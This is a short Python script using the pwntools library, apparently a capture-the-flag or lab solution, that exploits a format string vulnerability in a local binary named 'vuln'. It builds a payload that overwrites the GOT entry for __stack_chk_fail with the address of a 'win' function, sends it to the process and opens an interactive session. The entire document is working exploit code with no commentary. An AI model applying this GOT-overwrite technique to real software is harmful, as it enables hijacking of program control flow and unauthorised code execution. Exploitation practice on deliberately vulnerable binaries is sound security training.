from pwn import *

elf = context.binary = ELF("./vuln")

r = process(elf.path)

writes = {elf.got["__stack_chk_fail"]: elf.symbols["win"]}

payload = fmtstr_payload(6, writes)

r.sendline(payload)

r.interactive()
